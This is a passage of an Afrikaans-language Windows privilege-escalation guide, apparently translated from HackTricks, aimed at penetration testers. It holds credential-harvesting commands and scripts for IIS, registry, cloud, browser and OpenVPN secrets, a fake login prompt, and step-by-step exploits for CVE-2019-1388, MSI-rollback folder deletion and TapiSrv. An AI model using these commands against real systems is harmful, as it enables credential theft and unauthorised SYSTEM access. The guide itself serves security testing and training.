Hierdie kode is uit [**PowerUP**](https://github.com/PowerShellMafia/PowerSploit/blob/master/Privesc/PowerUp.ps1) onttrek:
```bash
function Get-ApplicationHost {
$OrigError = $ErrorActionPreference
$ErrorActionPreference = "SilentlyContinue"

# Check if appcmd.exe exists
if (Test-Path  ("$Env:SystemRoot\System32\inetsrv\appcmd.exe")) {
# Create data table to house results
$DataTable = New-Object System.Data.DataTable

# Create and name columns in the data table
$Null = $DataTable.Columns.Add("user")
$Null = $DataTable.Columns.Add("pass")
$Null = $DataTable.Columns.Add("type")
$Null = $DataTable.Columns.Add("vdir")
$Null = $DataTable.Columns.Add("apppool")

# Get list of application pools
Invoke-Expression "$Env:SystemRoot\System32\inetsrv\appcmd.exe list apppools /text:name" | ForEach-Object {

# Get application pool name
$PoolName = $_

# Get username
$PoolUserCmd = "$Env:SystemRoot\System32\inetsrv\appcmd.exe list apppool " + "`"$PoolName`" /text:processmodel.username"
$PoolUser = Invoke-Expression $PoolUserCmd

# Get password
$PoolPasswordCmd = "$Env:SystemRoot\System32\inetsrv\appcmd.exe list apppool " + "`"$PoolName`" /text:processmodel.password"
$PoolPassword = Invoke-Expression $PoolPasswordCmd

# Check if credentials exists
if (($PoolPassword -ne "") -and ($PoolPassword -isnot [system.array])) {
# Add credentials to database
$Null = $DataTable.Rows.Add($PoolUser, $PoolPassword,'Application Pool','NA',$PoolName)
}
}

# Get list of virtual directories
Invoke-Expression "$Env:SystemRoot\System32\inetsrv\appcmd.exe list vdir /text:vdir.name" | ForEach-Object {

# Get Virtual Directory Name
$VdirName = $_

# Get username
$VdirUserCmd = "$Env:SystemRoot\System32\inetsrv\appcmd.exe list vdir " + "`"$VdirName`" /text:userName"
$VdirUser = Invoke-Expression $VdirUserCmd

# Get password
$VdirPasswordCmd = "$Env:SystemRoot\System32\inetsrv\appcmd.exe list vdir " + "`"$VdirName`" /text:password"
$VdirPassword = Invoke-Expression $VdirPasswordCmd

# Check if credentials exists
if (($VdirPassword -ne "") -and ($VdirPassword -isnot [system.array])) {
# Add credentials to database
$Null = $DataTable.Rows.Add($VdirUser, $VdirPassword,'Virtual Directory',$VdirName,'NA')
}
}

# Check if any passwords were found
if( $DataTable.rows.Count -gt 0 ) {
# Display results in list view that can feed into the pipeline
$DataTable |  Sort-Object type,user,pass,vdir,apppool | Select-Object user,pass,type,vdir,apppool -Unique
}
else {
# Status user
Write-Verbose 'No application pool or virtual directory passwords were found.'
$False
}
}
else {
Write-Verbose 'Appcmd.exe does not exist in the default location.'
$False
}
$ErrorActionPreference = $OrigError
}
```
### SCClient / SCCM

Kontroleer of `C:\Windows\CCM\SCClient.exe` bestaan .\
Installers word met **SYSTEM-voorregte uitgevoer**, en baie is kwesbaar vir **DLL Sideloading (Info van** [**https://github.com/enjoiz/Privesc**](https://github.com/enjoiz/Privesc)**).**
```bash
$result = Get-WmiObject -Namespace "root\ccm\clientSDK" -Class CCM_Application -Property * | select Name,SoftwareVersion
if ($result) { $result }
else { Write "Not Installed." }
```
## Lêers en Register (Credentials)

### PuTTY-geloofsbriewe
```bash
reg query "HKCU\Software\SimonTatham\PuTTY\Sessions" /s | findstr "HKEY_CURRENT_USER HostName PortNumber UserName PublicKeyFile PortForwardings ConnectionSharing ProxyPassword ProxyUsername" #Check the values saved in each session, user/password could be there
```
### Putty SSH Host Keys
```
reg query HKCU\Software\SimonTatham\PuTTY\SshHostKeys\
```
### SSH-sleutels in die register

SSH-private sleutels kan binne die registersleutel `HKCU\Software\OpenSSH\Agent\Keys` gestoor word, dus moet jy kontroleer of daar enigiets interessant daarin is:
```bash
reg query 'HKEY_CURRENT_USER\Software\OpenSSH\Agent\Keys'
```
As jy enige inskrywing binne daardie pad vind, sal dit waarskynlik ’n gestoorde SSH key wees. Dit word geënkripteer gestoor, maar kan maklik gedekripteer word deur [https://github.com/ropnop/windows_sshagent_extract](https://github.com/ropnop/windows_sshagent_extract) te gebruik.\
Meer inligting oor hierdie tegniek hier: [https://blog.ropnop.com/extracting-ssh-private-keys-from-windows-10-ssh-agent/](https://blog.ropnop.com/extracting-ssh-private-keys-from-windows-10-ssh-agent/)

As die `ssh-agent`-diens nie loop nie en jy wil hê dit moet outomaties tydens selflaai begin, voer die volgende uit:
```bash
Get-Service ssh-agent | Set-Service -StartupType Automatic -PassThru | Start-Service
```
> [!TIP]
> Dit lyk asof hierdie tegniek nie meer geldig is nie. Ek het probeer om sommige ssh-sleutels te skep, dit met `ssh-add` by te voeg en via ssh by ’n masjien aan te meld. Die register HKCU\Software\OpenSSH\Agent\Keys bestaan nie, en procmon het nie die gebruik van `dpapi.dll` tydens die asimmetriese sleutelverifikasie geïdentifiseer nie.

### Onbewaakte lêers
```
C:\Windows\sysprep\sysprep.xml
C:\Windows\sysprep\sysprep.inf
C:\Windows\sysprep.inf
C:\Windows\Panther\Unattended.xml
C:\Windows\Panther\Unattend.xml
C:\Windows\Panther\Unattend\Unattend.xml
C:\Windows\Panther\Unattend\Unattended.xml
C:\Windows\System32\Sysprep\unattend.xml
C:\Windows\System32\Sysprep\unattended.xml
C:\unattend.txt
C:\unattend.inf
dir /s *sysprep.inf *sysprep.xml *unattended.xml *unattend.xml *unattend.txt 2>nul
```
Jy kan ook vir hierdie lêers soek met **metasploit**: _post/windows/gather/enum_unattend_

Voorbeeldinhoud:
```xml
<component name="Microsoft-Windows-Shell-Setup" publicKeyToken="31bf3856ad364e35" language="neutral" versionScope="nonSxS" processorArchitecture="amd64">
<AutoLogon>
<Password>U2VjcmV0U2VjdXJlUGFzc3dvcmQxMjM0Kgo==</Password>
<Enabled>true</Enabled>
<Username>Administrateur</Username>
</AutoLogon>

<UserAccounts>
<LocalAccounts>
<LocalAccount wcm:action="add">
<Password>*SENSITIVE*DATA*DELETED*</Password>
<Group>administrators;users</Group>
<Name>Administrateur</Name>
</LocalAccount>
</LocalAccounts>
</UserAccounts>
```
### SAM & SYSTEM-rugsteunlêers
```bash
# Usually %SYSTEMROOT% = C:\Windows
%SYSTEMROOT%\repair\SAM
%SYSTEMROOT%\System32\config\RegBack\SAM
%SYSTEMROOT%\System32\config\SAM
%SYSTEMROOT%\repair\system
%SYSTEMROOT%\System32\config\SYSTEM
%SYSTEMROOT%\System32\config\RegBack\system
```
### Wolkgeloofsbriewe
```bash
#From user home
.aws\credentials
AppData\Roaming\gcloud\credentials.db
AppData\Roaming\gcloud\legacy_credentials
AppData\Roaming\gcloud\access_tokens.db
.azure\accessTokens.json
.azure\azureProfile.json
```
### McAfee SiteList.xml

Soek vir ’n lêer genaamd **SiteList.xml**

### Gecachede GPP-wagwoord

’n Funksie was voorheen beskikbaar wat die ontplooiing van custom local administrator accounts op ’n groep masjiene via Group Policy Preferences (GPP) moontlik gemaak het. Hierdie metode het egter aansienlike security flaws gehad. Eerstens kon die Group Policy Objects (GPOs), wat as XML-lêers in SYSVOL gestoor is, deur enige domain user verkry word. Tweedens kon die wagwoorde binne hierdie GPPs, wat met AES256 deur ’n publiek gedokumenteerde default key encrypted is, deur enige authenticated user decrypted word. Dit het ’n ernstige risiko ingehou, aangesien dit gebruikers kon toelaat om elevated privileges te verkry.

Om hierdie risiko te verminder, is ’n funksie ontwikkel om te soek vir locally cached GPP-lêers wat ’n `"cpassword"`-veld bevat wat nie leeg is nie. Wanneer so ’n lêer gevind word, decrypt die funksie die wagwoord en gee ’n custom PowerShell object terug. Hierdie object bevat besonderhede oor die GPP en die lêer se ligging, wat help met die identifisering en remediation van hierdie security vulnerability.

Soek in `C:\ProgramData\Microsoft\Group Policy\history` of in _**C:\Documents and Settings\All Users\Application Data\Microsoft\Group Policy\history** (voor W Vista)_ vir hierdie lêers:

- Groups.xml
- Services.xml
- Scheduledtasks.xml
- DataSources.xml
- Printers.xml
- Drives.xml

**Om die cPassword te decrypt:**
```bash
#To decrypt these passwords you can decrypt it using
gpp-decrypt j1Uyj3Vx8TY9LtLZil2uAuZkFQA/4latT76ZwgdHdhw
```
Gebruik crackmapexec om die wagwoorde te kry:
```bash
crackmapexec smb 10.10.10.10 -u username -p pwd -M gpp_autologin
```
### IIS Web Config
```bash
Get-Childitem –Path C:\inetpub\ -Include web.config -File -Recurse -ErrorAction SilentlyContinue
```

```bash
C:\Windows\Microsoft.NET\Framework64\v4.0.30319\Config\web.config
type C:\Windows\Microsoft.NET\Framework644.0.30319\Config\web.config | findstr connectionString
C:\inetpub\wwwroot\web.config
```

```bash
Get-Childitem –Path C:\inetpub\ -Include web.config -File -Recurse -ErrorAction SilentlyContinue
Get-Childitem –Path C:\xampp\ -Include web.config -File -Recurse -ErrorAction SilentlyContinue
```
Voorbeeld van web.config met credentials:
```xml
<authentication mode="Forms">
<forms name="login" loginUrl="/admin">
<credentials passwordFormat = "Clear">
<user name="Administrator" password="SuperAdminPassword" />
</credentials>
</forms>
</authentication>
```
### OpenVPN-aanmeldbewyse
```csharp
Add-Type -AssemblyName System.Security
$keys = Get-ChildItem "HKCU:\Software\OpenVPN-GUI\configs"
$items = $keys | ForEach-Object {Get-ItemProperty $_.PsPath}

foreach ($item in $items)
{
$encryptedbytes=$item.'auth-data'
$entropy=$item.'entropy'
$entropy=$entropy[0..(($entropy.Length)-2)]

$decryptedbytes = [System.Security.Cryptography.ProtectedData]::Unprotect(
$encryptedBytes,
$entropy,
[System.Security.Cryptography.DataProtectionScope]::CurrentUser)

Write-Host ([System.Text.Encoding]::Unicode.GetString($decryptedbytes))
}
```
### Logs
```bash
# IIS
C:\inetpub\logs\LogFiles\*

#Apache
Get-Childitem –Path C:\ -Include access.log,error.log -File -Recurse -ErrorAction SilentlyContinue
```
### Vra vir credentials

Jy kan altyd **die gebruiker vra om sy credentials in te voer, of selfs die credentials van ’n ander gebruiker**, indien jy dink hy ken dit (let daarop dat dit werklik **riskant** is om die kliënt direk vir die **credentials** te vra):
```bash
$cred = $host.ui.promptforcredential('Failed Authentication','',[Environment]::UserDomainName+'\'+[Environment]::UserName,[Environment]::UserDomainName); $cred.getnetworkcredential().password
$cred = $host.ui.promptforcredential('Failed Authentication','',[Environment]::UserDomainName+'\\'+'anotherusername',[Environment]::UserDomainName); $cred.getnetworkcredential().password

#Get plaintext
$cred.GetNetworkCredential() | fl
```
### **Moontlike lêername wat credentials bevat**

Bekende lêers wat ’n tyd gelede **wagwoorde** in **clear-text** of **Base64** bevat het
```bash
$env:APPDATA\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history
vnc.ini, ultravnc.ini, *vnc*
web.config
php.ini httpd.conf httpd-xampp.conf my.ini my.cnf (XAMPP, Apache, PHP)
SiteList.xml #McAfee
ConsoleHost_history.txt #PS-History
*.gpg
*.pgp
*config*.php
elasticsearch.y*ml
kibana.y*ml
*.p12
*.der
*.csr
*.cer
known_hosts
id_rsa
id_dsa
*.ovpn
anaconda-ks.cfg
hostapd.conf
rsyncd.conf
cesi.conf
supervisord.conf
tomcat-users.xml
*.kdbx
KeePass.config
Ntds.dit
SAM
SYSTEM
FreeSSHDservice.ini
access.log
error.log
server.xml
ConsoleHost_history.txt
setupinfo
setupinfo.bak
key3.db         #Firefox
key4.db         #Firefox
places.sqlite   #Firefox
"Login Data"    #Chrome
Cookies         #Chrome
Bookmarks       #Chrome
History         #Chrome
TypedURLsTime   #IE
TypedURLs       #IE
%SYSTEMDRIVE%\pagefile.sys
%WINDIR%\debug\NetSetup.log
%WINDIR%\repair\sam
%WINDIR%\repair\system
%WINDIR%\repair\software, %WINDIR%\repair\security
%WINDIR%\iis6.log
%WINDIR%\system32\config\AppEvent.Evt
%WINDIR%\system32\config\SecEvent.Evt
%WINDIR%\system32\config\default.sav
%WINDIR%\system32\config\security.sav
%WINDIR%\system32\config\software.sav
%WINDIR%\system32\config\system.sav
%WINDIR%\system32\CCM\logs\*.log
%USERPROFILE%\ntuser.dat
%USERPROFILE%\LocalS~1\Tempor~1\Content.IE5\index.dat
```
Soek al die voorgestelde lêers:
```
cd C:\
dir /s/b /A:-D RDCMan.settings == *.rdg == *_history* == httpd.conf == .htpasswd == .gitconfig == .git-credentials == Dockerfile == docker-compose.yml == access_tokens.db == accessTokens.json == azureProfile.json == appcmd.exe == scclient.exe == *.gpg$ == *.pgp$ == *config*.php == elasticsearch.y*ml == kibana.y*ml == *.p12$ == *.cer$ == known_hosts == *id_rsa* == *id_dsa* == *.ovpn == tomcat-users.xml == web.config == *.kdbx == KeePass.config == Ntds.dit == SAM == SYSTEM == security == software == FreeSSHDservice.ini == sysprep.inf == sysprep.xml == *vnc*.ini == *vnc*.c*nf* == *vnc*.txt == *vnc*.xml == php.ini == https.conf == https-xampp.conf == my.ini == my.cnf == access.log == error.log == server.xml == ConsoleHost_history.txt == pagefile.sys == NetSetup.log == iis6.log == AppEvent.Evt == SecEvent.Evt == default.sav == security.sav == software.sav == system.sav == ntuser.dat == index.dat == bash.exe == wsl.exe 2>nul | findstr /v ".dll"
```

```
Get-Childitem –Path C:\ -Include *unattend*,*sysprep* -File -Recurse -ErrorAction SilentlyContinue | where {($_.Name -like "*.xml" -or $_.Name -like "*.txt" -or $_.Name -like "*.ini")}
```
### Credentials in the RecycleBin

Jy moet ook die Bin nagaan om na credentials daarin te soek

Om **passwords** wat deur verskeie programme gestoor is te **recover**, kan jy gebruik: [http://www.nirsoft.net/password_recovery_tools.html](http://www.nirsoft.net/password_recovery_tools.html)

### Binne die registry

**Ander moontlike registry keys met credentials**
```bash
reg query "HKCU\Software\ORL\WinVNC3\Password"
reg query "HKLM\SYSTEM\CurrentControlSet\Services\SNMP" /s
reg query "HKCU\Software\TightVNC\Server"
reg query "HKCU\Software\OpenSSH\Agent\Key"
```
[**Extract openssh keys from registry.**](https://blog.ropnop.com/extracting-ssh-private-keys-from-windows-10-ssh-agent/)

### Blaaiergeskiedenis

Jy moet kyk vir dbs waar wagwoorde van **Chrome of Firefox** gestoor word.\
Kyk ook na die geskiedenis, boekmerke en gunstelinge van die blaaiers, want moontlik word sommige **wagwoorde daar** gestoor.

Tools om wagwoorde uit blaaiers te onttrek:

- Mimikatz: `dpapi::chrome`
- [**SharpWeb**](https://github.com/djhohnstein/SharpWeb)
- [**SharpChromium**](https://github.com/djhohnstein/SharpChromium)
- [**SharpDPAPI**](https://github.com/GhostPack/SharpDPAPI)

### **COM DLL Overwriting**

**Component Object Model (COM)** is ’n tegnologie wat binne die Windows-bedryfstelsel ingebou is en **interkommunikasie** tussen sagtewarekomponente van verskillende tale moontlik maak. Elke COM-komponent word **via ’n klas-ID (CLSID) geïdentifiseer**, en elke komponent stel funksionaliteit via een of meer koppelvlakke bloot, wat deur koppelvlak-ID’s (IIDs) geïdentifiseer word.

COM-klasse en -koppelvlakke word onderskeidelik in die register onder **HKEY\CLASSES\ROOT\CLSID** en **HKEY\CLASSES\ROOT\Interface** gedefinieer. Hierdie register word geskep deur die samevoeging van **HKEY\LOCAL\MACHINE\Software\Classes** + **HKEY\CURRENT\USER\Software\Classes** = **HKEY\CLASSES\ROOT.**

Binne die CLSIDs van hierdie register kan jy die child-register **InProcServer32** vind, wat ’n **default value** bevat wat na ’n **DLL** wys, asook ’n waarde genaamd **ThreadingModel** wat **Apartment** (Single-Threaded), **Free** (Multi-Threaded), **Both** (Single of Multi) of **Neutral** (Thread Neutral) kan wees.

![Blaaiergeskiedenis - COM DLL Overwriting: Binne die CLSIDs van hierdie register kan jy die child-register InProcServer32 vind, wat ’n default value bevat wat na ’n DLL wys, asook ’n waarde...](<../../images/image (729).png>)

Basies, as jy enige van die **DLLs** wat uitgevoer gaan word kan **overwrite**, kan jy **privileges eskaleer** indien daardie DLL deur ’n ander gebruiker uitgevoer gaan word.

Om te leer hoe aanvallers COM Hijacking as ’n persistence-meganisme gebruik, kyk na:


{{#ref}}
com-hijacking.md
{{#endref}}

### **Generiese wagwoordsoektog in lêers en register**

**Soek vir lêerinhoud**
```bash
cd C:\ & findstr /SI /M "password" *.xml *.ini *.txt
findstr /si password *.xml *.ini *.txt *.config
findstr /spin "password" *.*
```
**Soek na 'n lêer met 'n spesifieke lêernaam**
```bash
dir /S /B *pass*.txt == *pass*.xml == *pass*.ini == *cred* == *vnc* == *.config*
where /R C:\ user.txt
where /R C:\ *.ini
```
**Soek die register vir sleutelname en wagwoorde**
```bash
REG QUERY HKLM /F "password" /t REG_SZ /S /K
REG QUERY HKCU /F "password" /t REG_SZ /S /K
REG QUERY HKLM /F "password" /t REG_SZ /S /d
REG QUERY HKCU /F "password" /t REG_SZ /S /d
```
### Gereedskap wat na wagwoorde soek

[**MSF-Credentials Plugin**](https://github.com/carlospolop/MSF-Credentials) **is 'n msf**-plugin. Ek het hierdie plugin geskep om **outomaties elke metasploit POST module uit te voer wat na credentials soek** binne die slagoffer.\
[**Winpeas**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite) soek outomaties na al die lêers wat wagwoorde bevat wat op hierdie bladsy genoem word.\
[**Lazagne**](https://github.com/AlessandroZ/LaZagne) is nog 'n uitstekende tool om wagwoorde uit 'n stelsel te onttrek.

Die tool [**SessionGopher**](https://github.com/Arvanaghi/SessionGopher) soek na **sessies**, **gebruikersname** en **wagwoorde** van verskeie tools wat hierdie data in gewone teks stoor (PuTTY, WinSCP, FileZilla, SuperPuTTY en RDP)
```bash
Import-Module path\to\SessionGopher.ps1;
Invoke-SessionGopher -Thorough
Invoke-SessionGopher -AllDomain -o
Invoke-SessionGopher -AllDomain -u domain.com\adm-arvanaghi -p s3cr3tP@ss
```
## Leaked Handlers

Stel jou voor dat **'n proses wat as SYSTEM loop 'n nuwe proses oopmaak** (`OpenProcess()`) met **volle toegang**. Dieselfde proses **skep ook 'n nuwe proses** (`CreateProcess()`) **met lae privileges, maar wat al die oop handles van die hoofproses erf**.\
As jy dan **volle toegang tot die proses met lae privileges het**, kan jy die **oop handle na die bevoorregte proses wat met** `OpenProcess()` **geskep is** bekom en **shellcode** daarin inspuit.\
[Lees hierdie voorbeeld vir meer inligting oor **hoe om hierdie kwesbaarheid op te spoor en uit te buit**.](leaked-handle-exploitation.md)\
[Lees hierdie **ander plasing vir 'n vollediger verduideliking van hoe om meer oop handles van prosesse en threads wat met verskillende vlakke van permissions geërf is, te toets en te misbruik (nie net volle toegang nie)**](http://dronesec.pw/blog/2019/08/22/exploiting-leaked-process-and-thread-handles/).

## Named Pipe Client Impersonation

Gedeelde geheuesegmente, waarna as **pipes** verwys word, maak proseskommunikasie en data-oordrag moontlik.

Windows verskaf 'n funksie genaamd **Named Pipes**, wat onverwante prosesse toelaat om data te deel, selfs oor verskillende netwerke. Dit lyk soos 'n kliënt/bediener-argitektuur, met rolle wat as **named pipe server** en **named pipe client** gedefinieer word.

Wanneer data deur 'n **client** via 'n pipe gestuur word, kan die **server** wat die pipe opgestel het die **identiteit van die client aanneem**, mits dit die nodige **SeImpersonate**-regte het. As jy 'n **bevoorregte proses** identifiseer wat kommunikeer via 'n pipe wat jy kan naboots, bied dit 'n geleentheid om **hoër privileges te verkry** deur die identiteit van daardie proses aan te neem sodra dit met die pipe wat jy opgestel het, interaksie het. Vir instruksies oor hoe om so 'n aanval uit te voer, kan nuttige gidse [**hier**](named-pipe-client-impersonation.md) en [**hier**](#from-high-integrity-to-system) gevind word.

Die volgende tool laat jou ook toe om 'n named pipe-kommunikasie met 'n tool soos burp te **onderskep:** [**https://github.com/gabriel-sztejnworcel/pipe-intercept**](https://github.com/gabriel-sztejnworcel/pipe-intercept) **en hierdie tool laat jou toe om al die pipes te lys en te sien om privescs te vind** [**https://github.com/cyberark/PipeViewer**](https://github.com/cyberark/PipeViewer)

## Telephony tapsrv remote DWORD write to RCE

Die Telephony-diens (TapiSrv) in server-modus stel `\\pipe\\tapsrv` (MS-TRP) bloot. 'n Remote authenticated client kan die mailslot-gebaseerde async event-pad misbruik om `ClientAttach` in 'n arbitrêre **4-byte write** na enige bestaande lêer wat deur `NETWORK SERVICE` geskryf kan word, te verander, en vervolgens Telephony-adminregte te verkry en 'n arbitrêre DLL as die diens te laai. Volledige vloei:

- `ClientAttach` met `pszDomainUser` gestel op 'n skryfbare bestaande pad → die diens maak dit oop via `CreateFileW(..., OPEN_EXISTING)` en gebruik dit vir async event-skrywings.
- Elke event skryf die aanvaller-beheerde `InitContext` vanaf `Initialize` na daardie handle. Registreer 'n line app met `LRegisterRequestRecipient` (`Req_Func 61`), aktiveer `TRequestMakeCall` (`Req_Func 121`), haal dit via `GetAsyncEvents` (`Req_Func 0`) op, en deregistreer/shutdown dan om deterministiese skrywings te herhaal.
- Voeg jouself by `[TapiAdministrators]` in `C:\Windows\TAPI\tsec.ini`, koppel weer, en roep `GetUIDllName` met 'n arbitrêre DLL-pad aan om `TSPI_providerUIIdentify` as `NETWORK SERVICE` uit te voer.

Meer besonderhede:

{{#ref}}
telephony-tapsrv-arbitrary-dword-write-to-rce.md
{{#endref}}

## Misc

### File Extensions that could execute stuff in Windows

Kyk na die bladsy **[https://filesec.io/](https://filesec.io/)**

### Protocol handler / ShellExecute abuse via Markdown renderers

Klikbare Markdown-skakels wat na `ShellExecuteExW` aangestuur word, kan gevaarlike URI-handlers (`file:`, `ms-appinstaller:` of enige geregistreerde skema) aktiveer en aanvaller-beheerde lêers as die huidige user uitvoer. Sien:

{{#ref}}
../protocol-handler-shell-execute-abuse.md
{{#endref}}

### **Monitoring Command Lines for passwords**

Wanneer jy 'n shell as 'n user kry, kan daar scheduled tasks of ander prosesse wees wat uitgevoer word en wat **credentials op die command line deurgee**. Die script hieronder vang proses-command lines elke twee sekondes vas en vergelyk die huidige toestand met die vorige toestand, en voer enige verskille uit.
```bash
while($true)
{
$process = Get-WmiObject Win32_Process | Select-Object CommandLine
Start-Sleep 1
$process2 = Get-WmiObject Win32_Process | Select-Object CommandLine
Compare-Object -ReferenceObject $process -DifferenceObject $process2
}
```
## Steel van wagwoorde uit prosesse

## Van Low Priv User na NT\AUTHORITY SYSTEM (CVE-2019-1388) / UAC Bypass

As jy toegang tot die grafiese koppelvlak het (via console of RDP) en UAC geaktiveer is, is dit in sommige weergawes van Microsoft Windows moontlik om ’n terminal of enige ander proses soos "NT\AUTHORITY SYSTEM" vanaf ’n unprivileged user uit te voer.

Dit maak dit moontlik om privileges te eskaleer en UAC terselfdertyd met dieselfde vulnerability te omseil. Daarbenewens hoef niks geïnstalleer te word nie, en die binary wat tydens die proses gebruik word, is deur Microsoft onderteken en uitgereik.

Sommige van die geaffekteerde stelsels is die volgende:
```
SERVER
======

Windows 2008r2	7601	** link OPENED AS SYSTEM **
Windows 2012r2	9600	** link OPENED AS SYSTEM **
Windows 2016	14393	** link OPENED AS SYSTEM **
Windows 2019	17763	link NOT opened


WORKSTATION
===========

Windows 7 SP1	7601	** link OPENED AS SYSTEM **
Windows 8		9200	** link OPENED AS SYSTEM **
Windows 8.1		9600	** link OPENED AS SYSTEM **
Windows 10 1511	10240	** link OPENED AS SYSTEM **
Windows 10 1607	14393	** link OPENED AS SYSTEM **
Windows 10 1703	15063	link NOT opened
Windows 10 1709	16299	link NOT opened
```
Om hierdie kwesbaarheid te ontgin, is dit nodig om die volgende stappe uit te voer:
```
1) Right click on the HHUPD.EXE file and run it as Administrator.

2) When the UAC prompt appears, select "Show more details".

3) Click "Show publisher certificate information".

4) If the system is vulnerable, when clicking on the "Issued by" URL link, the default web browser may appear.

5) Wait for the site to load completely and select "Save as" to bring up an explorer.exe window.

6) In the address path of the explorer window, enter cmd.exe, powershell.exe or any other interactive process.

7) You now will have an "NT\AUTHORITY SYSTEM" command prompt.

8) Remember to cancel setup and the UAC prompt to return to your desktop.
```
Jy het al die nodige lêers en inligting in die volgende GitHub repository:

https://github.com/jas502n/CVE-2019-1388<sup>[[35]](#references)</sup>

## Van Administrator Medium na High Integrity Level / UAC Bypass

Lees dit om meer oor **Integrity Levels** te leer:


{{#ref}}
integrity-levels.md
{{#endref}}

Lees dit dan om meer oor UAC en UAC bypasses te leer:


{{#ref}}
../authentication-credentials-uac-and-efs/uac-user-account-control.md
{{#endref}}

## Van Arbitrary Folder Delete/Move/Rename na SYSTEM EoP

Die tegniek wat [**in hierdie blogplasing**](https://www.zerodayinitiative.com/blog/2022/3/16/abusing-arbitrary-file-deletes-to-escalate-privilege-and-other-great-tricks) beskryf word, met exploit code wat [**hier beskikbaar is**](https://github.com/thezdi/PoC/tree/main/FilesystemEoPs).<sup>[[31]](#references)[[32]](#references)</sup>

Die aanval bestaan basies uit die misbruik van Windows Installer se rollback-funksie om wettige lêers gedurende die deïnstallasieproses met kwaadwillige lêers te vervang. Hiervoor moet die aanvaller ’n **kwaadwillige MSI installer** skep wat gebruik sal word om die `C:\Config.Msi`-lêergids te kaap. Windows Installer sal hierdie lêergids later gebruik om rollback-lêers tydens die deïnstallasie van ander MSI-pakkette te stoor, waar die rollback-lêers gewysig sou wees om die kwaadwillige payload te bevat.

Die opgesomde tegniek is soos volg:

1. **Stage 1 – Voorbereiding vir die Kaap (laat `C:\Config.Msi` leeg)**

- Stap 1: Installeer die MSI
- Skep ’n `.msi` wat ’n onskadelike lêer (byvoorbeeld `dummy.txt`) in ’n skryfbare lêergids (`TARGETDIR`) installeer.
- Merk die installer as **"UAC Compliant"**, sodat ’n **nie-admingebruiker** dit kan uitvoer.
- Hou ’n **handle** na die lêer oop nadat die installasie voltooi is.

- Stap 2: Begin die Deïnstallasie
- Deïnstalleer dieselfde `.msi`.
- Die deïnstallasieproses begin om lêers na `C:\Config.Msi` te skuif en hernoem hulle na `.rbf`-lêers (rollback-rugsteunlêers).
- **Poll die oop lêer-handle** met `GetFinalPathNameByHandle` om vas te stel wanneer die lêer `C:\Config.Msi\<random>.rbf` word.

- Stap 3: Custom Syncing
- Die `.msi` bevat ’n **custom uninstall action (`SyncOnRbfWritten`)** wat:
- ’n Sein stuur wanneer `.rbf` geskryf is.
- Dan op ’n ander event **wag** voordat die deïnstallasie voortgaan.

- Stap 4: Blokkeer die Verwydering van `.rbf`
- Wanneer dit gesein word, **open die `.rbf`-lêer** sonder `FILE_SHARE_DELETE` — dit **verhoed dat dit verwyder word**.
- Stuur dan ’n sein terug sodat die deïnstallasie kan voltooi.
- Windows Installer kan nie die `.rbf` verwyder nie, en omdat dit nie al die inhoud kan verwyder nie, word `C:\Config.Msi` **nie verwyder nie**.

- Stap 5: Verwyder `.rbf` Handmatig
- Jy (die aanvaller) verwyder die `.rbf`-lêer handmatig.
- `C:\Config.Msi` is nou **leeg** en gereed om gekaap te word.

> Op hierdie stadium, **aktiveer die SYSTEM-level arbitrary folder delete vulnerability** om `C:\Config.Msi` te verwyder.

2. **Stage 2 – Vervang Rollback Scripts met Kwaadwillige Scripts**

- Stap 6: Skep `C:\Config.Msi` Weer met Weak ACLs
- Skep die `C:\Config.Msi`-lêergids self weer.
- Stel **weak DACLs** (byvoorbeeld Everyone:F) en **hou ’n handle oop** met `WRITE_DAC`.

- Stap 7: Voer Nog ’n Installasie Uit
- Installeer die `.msi` weer met:
- `TARGETDIR`: Skryfbare ligging.
- `ERROROUT`: ’n Veranderlike wat ’n geforseerde fout aktiveer.
- Hierdie installasie sal gebruik word om **rollback** weer te aktiveer, wat `.rbs` en `.rbf` lees.

- Stap 8: Monitor vir `.rbs`
- Gebruik `ReadDirectoryChangesW` om `C:\Config.Msi` te monitor totdat ’n nuwe `.rbs` verskyn.
- Teken die lêernaam vas.

- Stap 9: Sinkroniseer voor Rollback
- Die `.msi` bevat ’n **custom install action (`SyncBeforeRollback`)** wat:
- ’n Event sein wanneer die `.rbs` geskep is.
- Dan **wag** voordat dit voortgaan.

- Stap 10: Pas Weak ACL Weer Toe
- Nadat jy die `.rbs created`-event ontvang het:
- Windows Installer **pas strong ACLs weer toe** op `C:\Config.Msi`.
- Maar omdat jy steeds ’n handle met `WRITE_DAC` het, kan jy **weak ACLs weer toepas**.

> ACLs word **slegs afgedwing wanneer ’n handle oopgemaak word**, dus kan jy steeds na die lêergids skryf.

- Stap 11: Plaas Vals `.rbs` en `.rbf`
- Oorskryf die `.rbs`-lêer met ’n **vals rollback script** wat aan Windows sê om:
- Jou `.rbf`-lêer (kwaadwillige DLL) na ’n **bevoorregte ligging** te herstel (byvoorbeeld `C:\Program Files\Common Files\microsoft shared\ink\HID.DLL`).
- Plaas jou vals `.rbf` wat ’n **kwaadwillige SYSTEM-level payload DLL** bevat.

- Stap 12: Aktiveer die Rollback
- Stuur ’n sein na die sync event sodat die installer voortgaan.
- ’n **type 19 custom action (`ErrorOut`)** is gekonfigureer om die installasie **doelbewus** op ’n bekende punt te laat misluk.
- Dit veroorsaak dat **rollback begin**.

- Stap 13: SYSTEM Installeer Jou DLL
- Windows Installer:
- Lees jou kwaadwillige `.rbs`.
- Kopieer jou `.rbf` DLL na die teikenligging.
- Jy het nou jou **kwaadwillige DLL in ’n SYSTEM-loaded path**.

- Finale Stap: Voer SYSTEM Code Uit
- Voer ’n vertroude **auto-elevated binary** (byvoorbeeld `osk.exe`) uit wat die DLL laai wat jy gekaap het.
- **Boom**: Jou code word **as SYSTEM** uitgevoer.


### Van Arbitrary File Delete/Move/Rename na SYSTEM EoP

Die hoof-MSI rollback-tegniek (die vorige een) aanvaar dat jy ’n **hele lêergids** (byvoorbeeld `C:\Config.Msi`) kan verwyder. Maar wat as jou vulnerability slegs **arbitrary file deletion** toelaat?

Jy kan **NTFS internals** uitbuit: elke lêergids het ’n versteekte alternate data stream genaamd:
```
C:\SomeFolder::$INDEX_ALLOCATION
```
Hierdie stream stoor die **indeksmetadata** van die vouer.

Dus, as jy die **`::$INDEX_ALLOCATION`-stream** van ’n vouer **delete**, verwyder NTFS **die hele vouer** uit die lêerstelsel.

Jy kan dit doen met standaardlêerverwyderings-API’s soos:
```c
DeleteFileW(L"C:\\Config.Msi::$INDEX_ALLOCATION");
```
